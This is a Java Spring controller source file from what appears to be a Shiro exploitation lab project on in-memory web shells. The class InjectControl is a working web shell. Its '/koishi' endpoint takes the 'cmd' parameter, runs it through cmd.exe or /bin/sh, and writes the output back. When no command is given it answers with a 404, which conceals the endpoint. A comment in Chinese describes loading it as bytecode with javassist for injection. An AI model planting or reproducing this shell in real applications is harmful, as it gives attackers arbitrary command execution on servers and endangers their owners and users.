package com.shiro.vuln.SpringMemShell.Controller;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.PrintWriter;
import java.util.Scanner;

@Controller
public class InjectControl {
    public InjectControl() {
    }

    /**
     * 这个类也可以学其他师傅那样，写个 util 专门来存字节码，但是为了让代码更直观，我就用 javassist 工具进行加载了
    * */

    @RequestMapping({"/koishi"})
    public void login(HttpServletRequest request, HttpServletResponse response) {
        try {
            String arg0 = request.getParameter("cmd");
            PrintWriter writer = response.getWriter();
            if (arg0 != null) {
                String o = "";
                ProcessBuilder p;
                if (System.getProperty("os.name").toLowerCase().contains("win")) {
                    p = new ProcessBuilder(new String[]{"cmd.exe", "/c", arg0});
                } else {
                    p = new ProcessBuilder(new String[]{"/bin/sh", "-c", arg0});
                }

                Scanner c = (new Scanner(p.start().getInputStream())).useDelimiter("\\\\A");
                o = c.hasNext() ? c.next() : o;
                c.close();
                writer.write(o);
                writer.flush();
                writer.close();
            } else {
                response.sendError(404);
            }
        } catch (Exception var8) {
        }
    }
}
